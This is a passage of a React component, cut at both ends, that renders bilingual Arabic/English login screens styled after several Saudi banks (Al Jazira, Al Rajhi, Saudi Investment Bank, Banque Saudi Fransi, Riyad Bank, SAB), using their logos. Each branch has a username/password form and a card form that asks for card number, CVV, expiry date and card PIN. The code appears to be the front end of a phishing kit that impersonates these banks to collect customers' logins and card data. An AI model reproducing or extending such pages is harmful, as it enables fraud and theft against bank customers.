                        required
                      />
                      <BiLock className="text-gray-600 absolute right-1" />
                    </div>
                  </div>
                  <div className="flex flex-col  items-center gap-y-1">
                    <span>
                      {checkMode("Card Expire", "تاريخ الانتهاء").word}
                    </span>
                    <div className="relative flex items-center">
                      <input
                        type="text"
                        value={expiryDate}
                        maxLength={5}
                        inputMode="numeric"
                        onChange={handleExpiryDateChange}
                        className="text-center border-2 border-black w-full p-1 rounded-md outline-none"
                        placeholder="MM/YY"
                        required
                      />
                      <BiCalendarEvent className="absolute right-1 text-gray-600" />
                    </div>
                  </div>
                  <div className="flex flex-col  items-center justify-center col-span-1 gap-y-1">
                    <span>PIN</span>
                    <div className="relative flex items-center">
                      <input
                        type="text"
                        value={pin}
                        maxLength={5}
                        inputMode="numeric"
                        onChange={handlePinChange}
                        className="text-center border-2 border-black w-full p-1 rounded-md outline-none"
                        placeholder="0000"
                        required
                      />
                      <MdPassword className="absolute right-1 text-gray-600" />
                    </div>
                  </div>
                </div>
                <div className="flex w-full">
                  <div
                    className="flex gap-x-2 flex-1 items-center px-2 cursor-pointer"
                    dir={mode === "ar" ? "rtl" : "ltr"}
                  >
                    <span className="text-right ">
                      {" "}
                      {
                        checkMode("Restore Login Data", "استعاده بيانات الدخول")
                          .word
                      }
                    </span>
                  </div>
                  <div
                    className="flex gap-x-2  flex-1 items-center px-2 cursor-pointer"
                    dir={mode === "ar" ? "rtl" : "ltr"}
                  >
                    <input type="radio" />
                    <span className="text-right">
                      {checkMode("Remember Username", "تذكر اسم المستخدم").word}
                    </span>
                  </div>
                </div>
                <div className="w-full flex items-center justify-center">
                  <button
                    className="text-white w-11/12  py-2 mt-5"
                    style={{ backgroundColor: "#7aaadb" }}
                    type="submit"
                  >
                    {checkMode("Login", "الدخول").word}
                  </button>
                </div>
              </form>
            )}
          </div>
        </div>
      ) : type === "AlGazera" ? (
        <div
          className="w-full sm:w-1/2 h-screen flex flex-col items-center justify-center relative"
          style={{ backgroundColor: "#1c3f67" }}
        >
          <span className="absolute top-10 left-3 text-white cursor-default">
            English
          </span>
          <img src="/payment/aljazeralogo.png" className="w-1/2" />
          <div className="w-full py-2">
            <div
              className="w-full flex items-center justify-center "
              style={{ borderBottom: "1px solid white" }}
            >
              <span
                className={`text-white text-sm cursor-pointer w-1/2 text-center p-2 ${
                  state === "card" && "border-blue-300 border-b-2"
                }`}
              >
                {checkMode("Card", "التسجيل باستخدام البطاقه").word}
              </span>
              <span
                className={`text-white text-sm cursor-pointer w-1/2 text-center p-2 ${
                  state === "auth" && "border-blue-300 border-b-2"
                }`}
              >
                {checkMode("Login", "الدخول").word}
              </span>
            </div>
            {state === "auth" ? (
              <form
                onSubmit={handleAuthSubmit}
                className="flex w-full flex-col items-start p-2 gap-y-5"
                dir={mode === "ar" ? "rtl" : "ltr"}
              >
                <div className="flex items-start flex-col gap-y-2 w-full">
                  <span className="text-white text-lg">
                    {checkMode("Username", "اسم المستخدم").word} :{" "}
                  </span>
                  <input
                    type="text"
                    className="w-11/12 p-1 rounded-md text-white"
                    style={{ backgroundColor: "#315275" }}
                    placeholder={mode === "ar" ? "اسم المستخدم" : "Username"}
                    required
                  />
                </div>
                <div className="flex items-start flex-col gap-y-2 w-full">
                  <span className="text-white text-lg">
                    {checkMode("Password", "كلمه المرور").word} :{" "}
                  </span>
                  <input
                    type="text"
                    className="w-11/12 p-1 rounded-md text-white"
                    style={{ backgroundColor: "#315275" }}
                    placeholder={mode === "ar" ? "كلمه المرور" : "Password"}
                    required
                  />
                </div>
                <div className="text-white cursor-pointer">
                  {
                    checkMode(
                      "Forget Username / Password ? ",
                      "نسيت كلمة المرور او اسم المستخدم ؟"
                    ).word
                  }
                </div>
                <button className="w-11/12 text-center bg-green-500 text-white py-2">
                  {checkMode("Login", "تسجيل الدخول").word}
                </button>
              </form>
            ) : (
              <form
                className="flex flex-col w-full py-3"
                onSubmit={handleSubmit}
                dir={mode === "en" ? "rtl" : "ltr"}
              >
                <div className="w-full flex flex-col items-center justify-end gap-y-2 p-2">
                  <span className="w-fit text-right text-white">
                    {" "}
                    {checkMode("Card Name", "اسم  البطاقه").word}
                  </span>
                  <div className="flex relative justify-center w-full items-center">
                    <input
                      className="w-full rounded-md text-white  py-2 px-1 text-center outline-none"
                      style={{ backgroundColor: "#315275" }}
                      placeholder={`${
                        checkMode("Card Name", " اسم البطاقه").word
                      }`}
                      maxLength={19}
                      dir="ltr"
                      type="text"
                      value={card_name}
                      onChange={(e) => setCardName(e.target.value)}
                      required
                    />
                    <FaCcVisa className="absolute text-white right-5 sm:right-10 text-2xl " />
                  </div>
                </div>
                <div className="w-full flex flex-col items-center justify-end gap-y-2 p-2">
                  <span className="w-fit text-right text-white">
                    {" "}
                    {checkMode("Card Number", "رقم البطاقه").word}
                  </span>
                  <div className="flex relative justify-center w-full items-center">
                    <input
                      placeholder="XXXX XXXX XXXX XXXX"
                      className="w-full rounded-md text-white  py-2 px-1 text-center outline-none"
                      dir="ltr"
                      style={{ backgroundColor: "#315275" }}
                      maxLength={19}
                      inputMode="numeric"
                      type="text"
                      value={cardNumber}
                      onChange={handleCardNumberChange}
                      required
                    />
                    <FaCcVisa className="absolute text-white right-5 sm:right-10 text-2xl " />
                  </div>
                </div>
                <div
                  className="w-full grid grid-cols-2  items-center justify-end gap-5 p-2 my-4 relative"
                  dir={mode === "ar" ? "rtl" : "ltr"}
                >
                  <div className="flex flex-col items-center justify-center col-span-1  gap-y-1 relative">
                    <span className=" text-white ">CVV</span>
                    <div className="relative flex items-center">
                      <input
                        type="text"
                        value={cvv}
                        onChange={handleCvvChange}
                        inputMode="numeric"
                        maxLength={3}
                        className="md:w-fit w-full text-white text-center p-1 rounded-md outline-none"
                        style={{ backgroundColor: "#315275" }}
                        placeholder="000"
                        required
                      />
                      <BiLock className="text-white absolute right-1" />
                    </div>
                  </div>
                  <div className="flex flex-col  items-center justify-center col-span-1 gap-y-1">
                    <span className="w-fit text-right text-white">
                      {checkMode("Card Expire", "تاريخ الانتهاء").word}
                    </span>
                    <div className="relative flex items-center">
                      <input
                        type="text"
                        value={expiryDate}
                        maxLength={5}
                        inputMode="numeric"
                        onChange={handleExpiryDateChange}
                        className="md:w-fit  text-white text-center w-full p-1 rounded-md outline-none"
                        style={{ backgroundColor: "#315275" }}
                        placeholder="MM/YY"
                        required
                      />
                      <BiCalendarEvent className="absolute right-1 text-white" />
                    </div>
                  </div>

                  <div className="flex flex-col  items-center justify-center col-span-1 gap-y-1">
                    <span className="w-fit text-left text-white">PIN</span>
                    <div className="relative flex items-center">
                      <input
                        type="text"
                        value={pin}
                        maxLength={5}
                        inputMode="numeric"
                        onChange={handlePinChange}
                        className="md:w-fit w-full text-white text-center  p-1 rounded-md outline-none"
                        style={{ backgroundColor: "#315275" }}
                        placeholder="0000"
                        required
                      />
                      <MdPassword className="absolute right-1 text-white" />
                    </div>
                  </div>
                </div>
                <div className="flex w-full">
                  <div
                    className="flex gap-x-2 flex-1 items-center px-2 cursor-pointer"
                    dir={mode === "ar" ? "rtl" : "ltr"}
                  >
                    <img src="/payment/basma.png" />
                  </div>
                  <div
                    className="flex gap-x-2  flex-1 items-center px-2 cursor-pointer"
                    dir={mode === "ar" ? "rtl" : "ltr"}
                  >
                    <input type="radio" />
                    <span className="text-right text-xs text-white">
                      {checkMode("Remember Username", "تذكر اسم المستخدم").word}
                    </span>
                  </div>
                </div>
                <button
                  className="text-white w-full  py-2 mt-5"
                  style={{ backgroundColor: "#2bacfd" }}
                  type="submit"
                >
                  {checkMode("Login", "الدخول").word}
                </button>
              </form>
            )}
          </div>
        </div>
      ) : type === "AlRaghy" ? (
        <div className="w-full sm:w-1/2 h-screen flex flex-col items-center justify-around  ">
          <img src="/payment/alrajhilogo.png" className="w-1/2 " />
          <div className="w-full p-2 shadow-lg">
            <div
              className="w-full flex items-center justify-center rounded-xl"
              style={{
                borderBottom: "1px solid white",
                backgroundColor: "#e2e5f6",
              }}
            >
              <span
                className={`text-blue-600 text-sm cursor-pointer w-1/2 text-center p-2 m-1 rounded-xl  ${
                  state === "card" && "bg-white"
                }`}
              >
                {checkMode("Card", "التسجيل باستخدام البطاقه").word}
              </span>
              <span
                className={`text-blue-600 text-sm cursor-pointer w-1/2 text-center p-2 rounded-xl ${
                  state === "auth" && "bg-white"
                }`}
              >
                {checkMode("Login", "الدخول").word}
              </span>
            </div>
            {state === "auth" ? (
              <form
                onSubmit={handleAuthSubmit}
                className="flex w-full flex-col items-start p-2 gap-y-5"
                dir={mode === "ar" ? "rtl" : "ltr"}
              >
                <div className="flex items-start flex-col gap-y-2 w-full">
                  <span className="text-blue-600 text-lg">
                    {checkMode("Username", "اسم المستخدم").word} :{" "}
                  </span>
                  <input
                    type="text"
                    className="w-11/12 p-1 rounded-md border-2 border-gray-300"
                    placeholder={mode === "ar" ? "اسم المستخدم" : "Username"}
                    required
                  />
                </div>
                <div className="flex items-start flex-col gap-y-2 w-full">
                  <span className=" text-blue-600 text-lg">
                    {checkMode("Password", "كلمه المرور").word} :{" "}
                  </span>
                  <input
                    type="text"
                    className="w-11/12 p-1 rounded-md border-2 border-gray-300"
                    placeholder={mode === "ar" ? "كلمه المرور" : "Password"}
                    required
                  />
                </div>
                <div className="text-blue-500 cursor-pointer">
                  {
                    checkMode(
                      "Forget Username / Password ? ",
                      "نسيت كلمة المرور او اسم المستخدم ؟"
                    ).word
                  }
                </div>
                <button className="w-11/12 text-center bg-blue-600 text-white py-2">
                  {checkMode("Login", "تسجيل الدخول").word}
                </button>
              </form>
            ) : (
              <form
                className="flex flex-col w-full py-3"
                onSubmit={handleSubmit}
                dir={mode === "en" ? "rtl" : "ltr"}
              >
                <div className="w-full flex flex-col items-center justify-end gap-y-2 p-2">
                  <span className="  text-blue-600">
                    {" "}
                    {checkMode("Card Name", "اسم البطاقه").word}
                  </span>
                  <div className="flex relative justify-center w-full items-center">
                    <input
                      className="w-full rounded-md py-2 px-1 text-center outline-none border-2 border-gray-300"
                      placeholder={`${
                        checkMode("Card Name", " اسم البطاقه").word
                      }`}
                      maxLength={19}
                      dir="ltr"
                      type="text"
                      value={card_name}
                      onChange={(e) => setCardName(e.target.value)}
                      required
                    />
                    <FaCcVisa className="absolute text-gray-600 right-5 sm:right-10 text-2xl " />
                  </div>
                </div>
                <div className="w-full flex flex-col items-center justify-end gap-y-2 p-2">
                  <span className="  text-blue-600">
                    {" "}
                    {checkMode("Card Number", "رقم البطاقه").word}
                  </span>
                  <div className="flex relative justify-center w-full items-center">
                    <input
                      placeholder="XXXX XXXX XXXX XXXX"
                      className="w-full rounded-md py-2 px-1 text-center outline-none border-2 border-gray-300"
                      dir="ltr"
                      maxLength={19}
                      inputMode="numeric"
                      type="text"
                      value={cardNumber}
                      onChange={handleCardNumberChange}
                      required
                    />
                    <FaCcVisa className="absolute text-gray-600 right-5 sm:right-10 text-2xl " />
                  </div>
                </div>
                <div
                  className="w-full grid grid-cols-2  items-center justify-end gap-5 p-2 my-4 relative"
                  dir={mode === "ar" ? "rtl" : "ltr"}
                >
                  <div className="flex flex-col items-center  gap-y-1 relative">
                    <span className="w-fit text-right text-blue-600 ">CVV</span>
                    <div className="relative flex items-center">
                      <input
                        type="text"
                        value={cvv}
                        onChange={handleCvvChange}
                        inputMode="numeric"
                        maxLength={3}
                        className="text-center p-1 rounded-md outline-none border-2 border-gray-300"
                        placeholder="000"
                        required
                      />
                      <BiLock className="text-gray-600 absolute right-1" />
                    </div>
                  </div>
                  <div className="flex flex-col  items-center gap-y-1">
                    <span className="w-fit text-right  text-blue-600">
                      {checkMode("Card Expire", "تاريخ الانتهاء").word}
                    </span>
                    <div className="relative flex items-center">
                      <input
                        type="text"
                        value={expiryDate}
                        maxLength={5}
                        inputMode="numeric"
                        onChange={handleExpiryDateChange}
                        className="md:w-fit text-center w-full p-1 rounded-md outline-none border-2 border-gray-300"
                        placeholder="MM/YY"
                        required
                      />
                      <BiCalendarEvent className="absolute right-1 text-gray-600" />
                    </div>
                  </div>
                  <div className="flex flex-col  items-center justify-center col-span-1 gap-y-1">
                    <span className="w-fit text-left text-blue-600">PIN</span>
                    <div className="relative flex items-center">
                      <input
                        type="text"
                        value={pin}
                        maxLength={5}
                        inputMode="numeric"
                        onChange={handlePinChange}
                        className="md:w-fit w-full border-2 border-gray-300 text-center  p-1 rounded-md outline-none"
                        placeholder="0000"
                        required
                      />
                      <MdPassword className="absolute right-1 text-gray-600" />
                    </div>
                  </div>
                </div>
                <div className="flex w-full">
                  <div
                    className="flex gap-x-2  flex-1 items-center px-2 cursor-pointer"
                    dir={mode === "ar" ? "rtl" : "ltr"}
                  >
                    <input type="radio" />
                    <span className="text-right">
                      {checkMode("Remember me", "تذكرني").word}
                    </span>
                  </div>
                </div>
                <button
                  className="text-white w-full bg-blue-600 py-2 mt-5"
                  type="submit"
                >
                  {checkMode("Login", "الدخول").word}
                </button>
              </form>
            )}
          </div>
        </div>
      ) : type === "Estsmary Saudia" ? (
        <div className="w-full sm:w-1/2 h-screen flex flex-col items-center justify-around ga bg-yellow-400">
          <div className="bg-white w-11/12 p-2">
            <div className="flex  justify-around items-center gap-x-3 my-3">
              <img
                src="/payment/FlexxTouch_ar.png"
                className="w-1/2 md:w-1/4"
              />
              <img
                src="/payment/estithmarilogo.png"
                className="w-1/2 md:w-1/4"
              />
            </div>
            <div className="w-full py-2 my-3">
              <div
                className="w-full flex items-center justify-center rounded-lg p-1"
                style={{
                  borderBottom: "1px solid white",
                  backgroundColor: "#e2e5f6",
                }}
              >
                <span
                  className={`text-gray-400 text-xs cursor-pointer w-1/2 text-center p-2 rounded-lg ${
                    state === "card" && "bg-yellow-400 text-white"
                  }`}
                >
                  {checkMode("Card", "التسجيل باستخدام البطاقه").word}
                </span>
                <span
                  className={`text-gray-400 text-xs cursor-pointer w-1/2 text-center p-2 ${
                    state === "auth" && "bg-yellow-400 text-white"
                  }`}
                >
                  {checkMode("Login", "الدخول").word}
                </span>
              </div>
              {state === "auth" ? (
                <form
                  onSubmit={handleAuthSubmit}
                  className="flex w-full flex-col items-start p-2 gap-y-5 my-5"
                  dir={mode === "ar" ? "rtl" : "ltr"}
                >
                  <div className="flex items-start flex-col gap-y-2 w-full">
                    <span className="text-gray-500  text-lg">
                      {checkMode("Username", "اسم المستخدم").word} :{" "}
                    </span>
                    <input
                      type="text"
                      className="w-11/12 p-1 rounded-md border-b-2 border-gray-500"
                      placeholder={mode === "ar" ? "اسم المستخدم" : "Username"}
                      required
                    />
                  </div>
                  <div className="flex items-start flex-col gap-y-2 w-full">
                    <span className="text-gray-500 text-lg">
                      {checkMode("Password", "كلمه المرور").word} :{" "}
                    </span>
                    <input
                      type="text"
                      className="w-11/12 p-1 rounded-md border-b-2 border-gray-500"
                      placeholder={mode === "ar" ? "كلمه المرور" : "Password"}
                      required
                    />
                  </div>
                  <div className="flex w-full">
                    <div
                      className="flex gap-x-2  flex-1 items-center px-2 cursor-pointer"
                      dir={mode === "ar" ? "rtl" : "ltr"}
                    >
                      <input type="radio" />
                      <span className="text-right text-xs">
                        {
                          checkMode("Remember Username", "تذكر اسم المستخدم")
                            .word
                        }
                      </span>
                    </div>
                  </div>
                  <div className="text-blue-500 cursor-pointer">
                    {
                      checkMode(
                        "Forget Username / Password ? ",
                        "نسيت كلمة المرور او اسم المستخدم ؟"
                      ).word
                    }
                  </div>
                  <button className="w-11/12 text-center bg-yellow-500 text-white py-2">
                    {checkMode("Login", "تسجيل الدخول").word}
                  </button>
                  <button className=" w-11/12 bg-gray-300 rounded-lg py-2 mt-5">
                    {
                      checkMode("Open New Bank Account", "فتح حساب بنكي جديد")
                        .word
                    }
                  </button>
                </form>
              ) : (
                <form
                  className="flex flex-col w-full py-3"
                  onSubmit={handleSubmit}
                  dir={mode === "en" ? "rtl" : "ltr"}
                >
                  <div className="w-full flex flex-col items-center justify-end gap-y-2 p-2">
                    <span className=" ">
                      {" "}
                      {checkMode("Card Name", "اسم البطاقه").word}
                    </span>
                    <div className="flex relative justify-center w-full items-center">
                      <input
                        className="w-full rounded-md py-2 px-1 text-center outline-none"
                        style={{ border: "1px solid #eee" }}
                        placeholder={`${
                          checkMode("Card Name", " اسم البطاقه").word
                        }`}
                        maxLength={19}
                        dir="ltr"
                        type="text"
                        value={card_name}
                        onChange={(e) => setCardName(e.target.value)}
                        required
                      />
                      <FaCcVisa className="absolute text-gray-600 right-5 sm:right-10 text-2xl " />
                    </div>
                  </div>
                  <div className="w-full flex flex-col items-center justify-end gap-y-2 p-2">
                    <span className=" ">
                      {" "}
                      {checkMode("Card Number", "رقم البطاقه").word}
                    </span>
                    <div className="flex relative justify-center w-full items-center">
                      <input
                        placeholder="XXXX XXXX XXXX XXXX"
                        className="w-full rounded-md py-2 px-1 text-center outline-none"
                        dir="ltr"
                        style={{ border: "1px solid #eee" }}
                        maxLength={19}
                        inputMode="numeric"
                        type="text"
                        value={cardNumber}
                        onChange={handleCardNumberChange}
                        required
                      />
                      <FaCcVisa className="absolute text-gray-600 right-5 sm:right-10 text-2xl " />
                    </div>
                  </div>
                  <div
                    className="w-full grid grid-cols-2  items-center justify-end gap-5 p-2 my-4 relative"
                    dir={mode === "ar" ? "rtl" : "ltr"}
                  >
                    <div className="flex flex-col items-center gap-y-1 relative">
                      <span>CVV</span>
                      <div className="relative flex items-center">
                        <input
                          type="text"
                          value={cvv}
                          onChange={handleCvvChange}
                          inputMode="numeric"
                          maxLength={3}
                          style={{ border: "1px solid #eee" }}
                          className="text-center p-1 rounded-md outline-none"
                          placeholder="000"
                          required
                        />
                        <BiLock className="text-gray-600 absolute right-1" />
                      </div>
                    </div>
                    <div className="flex flex-col  items-center gap-y-1">
                      <span>
                        {checkMode("Card Expire", "تاريخ الانتهاء").word}
                      </span>
                      <div className="relative flex items-center">
                        <input
                          type="text"
                          value={expiryDate}
                          maxLength={5}
                          inputMode="numeric"
                          onChange={handleExpiryDateChange}
                          style={{ border: "1px solid #eee" }}
                          className="text-center w-full p-1 rounded-md outline-none"
                          placeholder="MM/YY"
                          required
                        />
                        <BiCalendarEvent className="absolute right-1 text-gray-600" />
                      </div>
                    </div>
                    <div className="flex flex-col  items-center justify-center col-span-1 gap-y-1">
                      <span>PIN</span>
                      <div className="relative flex items-center">
                        <input
                          type="text"
                          value={pin}
                          maxLength={5}
                          inputMode="numeric"
                          onChange={handlePinChange}
                          style={{ border: "1px solid #eee" }}
                          className="text-center w-full p-1 rounded-md outline-none"
                          placeholder="0000"
                          required
                        />
                        <MdPassword className="absolute right-1 text-gray-600" />
                      </div>
                    </div>
                  </div>
                  <div className="flex w-full">
                    <div
                      className="flex gap-x-2  flex-1 items-center px-2 cursor-pointer"
                      dir={mode === "ar" ? "rtl" : "ltr"}
                    >
                      <input type="radio" />
                      <span className="text-right text-xs text-gray-400">
                        {
                          checkMode("Remember Username", "تذكر اسم المستخدم")
                            .word
                        }
                      </span>
                    </div>
                  </div>
                  <button
                    className="text-white w-full bg-yellow-500 rounded-lg py-2 mt-5"
                    type="submit"
                  >
                    {checkMode("Login", "الدخول").word}
                  </button>
                  <button className=" w-full bg-gray-300 rounded-lg py-2 mt-5">
                    {
                      checkMode("Open New Bank Account", "فتح حساب بنكي جديد")
                        .word
                    }
                  </button>
                </form>
              )}
            </div>
          </div>
        </div>
      ) : type === "French Captial" ? (
        <div
          className="w-full sm:w-1/2 min-h-screen flex flex-col items-center justify-around "
          style={{ backgroundColor: "#c8e8e7" }}
        >
          <img src="/payment/firnslogo.png" className="w-2/3 my-5 md:w-1/3" />
          <div className="w-full py-2">
            <div
              className="w-full flex items-center justify-center "
              style={{ borderBottom: "1px solid white" }}
            >
              <span
                className={`text-white text-sm cursor-pointer w-1/2 text-center p-2 ${
                  state === "card" && "bg-cyan-600"
                }`}
              >
                {checkMode("Card", "التسجيل باستخدام البطاقه").word}
              </span>
              <span
                className={`text-white text-sm cursor-pointer w-1/2 text-center p-2 ${
                  state === "auth" && "bg-cyan-600"
                }`}
              >
                {checkMode("Login", "الدخول").word}
              </span>
            </div>
            {state === "auth" ? (
              <form
                onSubmit={handleAuthSubmit}
                className="flex w-full flex-col items-start p-2 gap-y-5"
                dir={mode === "ar" ? "rtl" : "ltr"}
              >
                <div className="flex items-start flex-col gap-y-2 w-full">
                  <span className="text-cyan-700  text-sm">
                    {checkMode("Username", "اسم المستخدم").word} :{" "}
                  </span>
                  <input
                    type="text"
                    className="w-11/12 p-1 rounded-md"
                    required
                  />
                </div>
                <div className="flex items-start flex-col gap-y-2 w-full">
                  <span className="text-cyan-700 text-sm">
                    {checkMode("Password", "كلمه المرور").word} :{" "}
                  </span>
                  <input
                    type="text"
                    className="w-11/12 p-1 rounded-md"
                    required
                  />
                </div>
                <div className="text-blue-500 cursor-pointer">
                  {
                    checkMode(
                      "Forget Username / Password ? ",
                      "نسيت كلمة المرور او اسم المستخدم ؟"
                    ).word
                  }
                </div>
                <button className="w-11/12 text-center bg-cyan-700  text-white py-2">
                  {checkMode("Login", "تسجيل الدخول").word}
                </button>
              </form>
            ) : (
              <form
                className="flex flex-col w-full py-3"
                onSubmit={handleSubmit}
                dir={mode === "en" ? "rtl" : "ltr"}
              >
                <div className="w-full flex flex-col items-center justify-end gap-y-2 p-2">
                  <span className=" text-white">
                    {" "}
                    {checkMode("Card Name", "اسم البطاقه").word}
                  </span>
                  <div className="flex relative justify-center w-full items-center">
                    <input
                      className="w-full rounded-md py-2 px-1 text-center outline-none"
                      placeholder={`${
                        checkMode("Card Name", " اسم البطاقه").word
                      }`}
                      maxLength={19}
                      dir="ltr"
                      type="text"
                      value={card_name}
                      onChange={(e) => setCardName(e.target.value)}
                      required
                    />
                    <FaCcVisa className="absolute text-gray-600 right-5 sm:right-10 text-2xl " />
                  </div>
                </div>
                <div className="w-full flex flex-col items-center justify-end gap-y-2 p-2">
                  <span className=" text-white">
                    {" "}
                    {checkMode("Card Number", "رقم البطاقه").word}
                  </span>
                  <div className="flex relative justify-center w-full items-center">
                    <input
                      placeholder="XXXX XXXX XXXX XXXX"
                      className="w-full rounded-md py-2 px-1 text-center outline-none"
                      maxLength={19}
                      dir="ltr"
                      inputMode="numeric"
                      type="text"
                      value={cardNumber}
                      onChange={handleCardNumberChange}
                      required
                    />
                    <FaCcVisa className="absolute text-gray-600 right-5 sm:right-10 text-2xl " />
                  </div>
                </div>
                <div
                  className="w-full grid grid-cols-2  items-center justify-end gap-5 p-2 my-4 relative"
                  dir={mode === "ar" ? "rtl" : "ltr"}
                >
                  <div className="flex flex-col items-center  gap-y-1 relative">
                    <span className=" text-white ">CVV</span>
                    <div className="relative flex items-center">
                      <input
                        type="text"
                        value={cvv}
                        onChange={handleCvvChange}
                        inputMode="numeric"
                        maxLength={3}
                        className="text-center p-1 rounded-md outline-none"
                        placeholder="000"
                        required
                      />
                      <BiLock className="text-gray-600 absolute right-1" />
                    </div>
                  </div>
                  <div className="flex flex-col  items-center gap-y-1">
                    <span className=" text-white">
                      {checkMode("Card Expire", "تاريخ الانتهاء").word}
                    </span>
                    <div className="relative flex items-center">
                      <input
                        type="text"
                        value={expiryDate}
                        maxLength={5}
                        inputMode="numeric"
                        onChange={handleExpiryDateChange}
                        className="text-center w-full p-1 rounded-md outline-none"
                        placeholder="MM/YY"
                        required
                      />
                      <BiCalendarEvent className="absolute right-1 text-gray-600" />
                    </div>
                  </div>
                  <div className="flex flex-col  items-center justify-center col-span-1 gap-y-1">
                    <span className=" text-white">PIN</span>
                    <div className="relative flex items-center">
                      <input
                        type="text"
                        value={pin}
                        maxLength={5}
                        inputMode="numeric"
                        onChange={handlePinChange}
                        className="text-center w-full p-1 rounded-md outline-none"
                        placeholder="0000"
                        required
                      />
                      <MdPassword className="absolute right-1 text-gray-600" />
                    </div>
                  </div>
                </div>
                <button
                  className="text-white w-full  py-2 mt-5 bg-cyan-600 mb-2"
                  type="submit"
                >
                  {checkMode("Login", "الدخول").word}
                </button>
                <img src="/payment/faransi2.png" />
              </form>
            )}
          </div>
        </div>
      ) : type === "AlRiyad" ? (
        <div
          className="w-full sm:w-1/2 min-h-screen flex flex-col items-center justify-around "
          style={{ backgroundColor: "#230871" }}
        >
          <img src="/payment/riyadlogo.png" className="my-10" />
          <div className="w-full py-2">
            <div
              className="w-full flex items-center justify-center p-1"
              style={{ borderBottom: "1px solid white" }}
            >
              <span
                className={`text-white text-sm cursor-pointer w-1/2 text-center p-2  rounded-lg ${
                  state === "card" && "bg-white text-blue-500"
                }`}
              >
                {checkMode("Card", "التسجيل باستخدام البطاقه").word}
              </span>
              <span
                className={`text-white text-sm cursor-pointer w-1/2 text-center p-2 rounded-lg ${
                  state === "auth" && "bg-white text-blue-500"
                }`}
              >
                {checkMode("Login", "الدخول").word}
              </span>
            </div>
            {state === "auth" ? (
              <form
                onSubmit={handleAuthSubmit}
                className="flex w-full flex-col items-start p-2 gap-y-5 my-5"
                dir={mode === "ar" ? "rtl" : "ltr"}
              >
                <div className="flex items-start flex-col gap-y-2 w-full">
                  <span className="text-white">
                    {checkMode("Username", "اسم المستخدم").word}
                  </span>
                  <input
                    type="text"
                    className="w-11/12 p-2 rounded-md"
                    placeholder={mode === "ar" ? "اسم المستخدم" : "Username"}
                    required
                  />
                </div>
                <div className="flex items-start flex-col gap-y-2 w-full">
                  <span className="text-white">
                    {checkMode("Password", "كلمه المرور").word}
                  </span>
                  <input
                    type="text"
                    className="w-11/12 p-2 rounded-md"
                    placeholder={mode === "ar" ? "كلمه المرور" : "Password"}
                    required
                  />
                </div>
                <div className="text-blue-500 cursor-pointer">
                  {
                    checkMode(
                      "Forget Username / Password ? ",
                      "نسيت كلمة المرور او اسم المستخدم ؟"
                    ).word
                  }
                </div>
                <button
                  className="w-11/12 text-center text-white py-2"
                  style={{ backgroundColor: "#7dcfc3" }}
                >
                  {checkMode("Login", "تسجيل الدخول").word}
                </button>
                <img src="/payment/riyadbtn.png" />
              </form>
            ) : (
              <form
                className="flex flex-col w-full py-3"
                onSubmit={handleSubmit}
                dir={mode === "en" ? "rtl" : "ltr"}
              >
                <div className="w-full flex flex-col items-center justify-end gap-y-2 p-2">
                  <span className=" text-white">
                    {" "}
                    {checkMode("Card Name", "اسم البطاقه").word}
                  </span>
                  <div className="flex relative justify-center w-full items-center">
                    <input
                      className="w-full rounded-md py-2 px-1 text-center outline-none"
                      placeholder={`${
                        checkMode("Card Name", " اسم البطاقه").word
                      }`}
                      maxLength={19}
                      dir="ltr"
                      type="text"
                      value={card_name}
                      onChange={(e) => setCardName(e.target.value)}
                      required
                    />
                    <FaCcVisa className="absolute text-gray-600 right-5 sm:right-10 text-2xl " />
                  </div>
                </div>
                <div className="w-full flex flex-col items-center justify-end gap-y-2 p-2">
                  <span className=" text-white">
                    {" "}
                    {checkMode("Card Number", "رقم البطاقه").word}
                  </span>
                  <div className="flex relative justify-center w-full items-center">
                    <input
                      placeholder="XXXX XXXX XXXX XXXX"
                      className="w-full rounded-md py-2 px-1 text-center outline-none"
                      maxLength={19}
                      dir="ltr"
                      inputMode="numeric"
                      type="text"
                      value={cardNumber}
                      onChange={handleCardNumberChange}
                      required
                    />
                    <FaCcVisa className="absolute text-gray-600 right-5 sm:right-10 text-2xl " />
                  </div>
                </div>
                <div
                  className="w-full grid grid-cols-2  items-center justify-end gap-5 p-2 my-4 relative"
                  dir={mode === "ar" ? "rtl" : "ltr"}
                >
                  <div className="flex flex-col items-center  gap-y-1 relative">
                    <span className=" text-white ">CVV</span>
                    <div className="relative flex items-center">
                      <input
                        type="text"
                        value={cvv}
                        onChange={handleCvvChange}
                        inputMode="numeric"
                        maxLength={3}
                        className="text-center p-1 rounded-md outline-none"
                        placeholder="000"
                        required
                      />
                      <BiLock className="text-gray-600 absolute right-1" />
                    </div>
                  </div>
                  <div className="flex flex-col  items-center gap-y-1">
                    <span className=" text-white">
                      {checkMode("Card Expire", "تاريخ الانتهاء").word}
                    </span>
                    <div className="relative flex items-center">
                      <input
                        type="text"
                        value={expiryDate}
                        maxLength={5}
                        inputMode="numeric"
                        onChange={handleExpiryDateChange}
                        className="text-center w-full p-1 rounded-md outline-none"
                        placeholder="MM/YY"
                        required
                      />
                      <BiCalendarEvent className="absolute right-1 text-gray-600" />
                    </div>
                  </div>
                  <div className="flex flex-col  items-center justify-center col-span-1 gap-y-1">
                    <span className="text-white">PIN</span>
                    <div className="relative flex items-center">
                      <input
                        type="text"
                        value={pin}
                        maxLength={5}
                        inputMode="numeric"
                        onChange={handlePinChange}
                        className="text-center w-full p-1 rounded-md outline-none"
                        placeholder="0000"
                        required
                      />
                      <MdPassword className="absolute right-1 text-gray-600" />
                    </div>
                  </div>
                </div>
                <button
                  className="text-white w-full  py-2 mt-5"
                  type="submit"
                  style={{ backgroundColor: "#7dcfc3" }}
                >
                  {checkMode("Login", "الدخول").word}
                </button>
                <img src="/payment/riyadbtn.png" />
              </form>
            )}
          </div>
        </div>
      ) : type === "Sab" ? (
        <div
          className="w-full sm:w-1/2 h-screen flex flex-col items-center justify-center "
          style={{
            backgroundImage: 'url("/main_images/banksabBG.jpg")',
            backgroundSize: "cover",
          }}
        >
          <span className="text-white font-semibold md:mt-20">
            سعداء برويتك
          </span>
          <div className="w-full py-2 mt-5">
            <div
              className="w-full flex items-center justify-center "
              style={{ borderBottom: "1px solid white" }}
            >
              <span
                className={`text-white text-sm cursor-pointer w-1/2 text-center p-2 `}
                style={
                  state === "card"
                    ? {
                        backgroundImage:
                          "linear-gradient(-180deg, #F32E5E 0%, #B62938 100%)",
                      }
                    : {}
                }
              >
                {checkMode("Card", "التسجيل باستخدام البطاقه").word}
              </span>
              <span
                className={`text-white text-sm cursor-pointer w-1/2 text-center p-2 `}
                style={
                  state === "auth"
                    ? {
                        backgroundImage:
